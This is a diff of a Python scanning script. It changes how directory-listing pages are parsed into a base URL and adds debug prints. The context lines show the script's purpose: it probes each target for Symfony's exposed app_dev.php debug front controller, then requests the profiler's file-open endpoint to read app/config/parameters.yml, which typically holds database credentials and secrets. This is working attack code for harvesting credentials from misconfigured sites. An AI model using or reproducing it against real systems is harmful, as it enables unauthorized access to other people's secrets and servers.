@@ -167,11 +167,11 @@ def fix_url(url):
 
 def fix_index_url(url,content):
 	"""
-	This function give a valid url (url maybe changed)
+	This function give a valid url because url maybe changed if redirection
 	"""
 	if(re.search(".*Index of.*",content)):
-		path = content.split('Index of ')[1].split('</title>')[0].strip()
-		if path == '/':
+		path = content.split('Index of ')[1].split('<')[0].strip()
+		if path == '/' or path[len(path)-1] == '/':
 			url = url.split('://')[0]+'://'+url.split('/')[2]+path
 		else:
 			url = url.split('://')[0]+'://'+url.split('/')[2]+path+'/'
@@ -283,7 +283,9 @@ try:
 				url = fix_url(url)
 				try:
 					check0 = requests.get(url, verify=False, timeout=5)
+					print(url)
 					url = fix_index_url(url,check0.text)
+					print(url)
 					check1 = requests.get(url+'app_dev.php', verify=False, timeout=5)
 					if(check1.status_code != 403):
 						check2 = requests.get(url+'app_dev.php/_profiler/open?file=app/config/parameters.yml', verify=False, timeout=5)
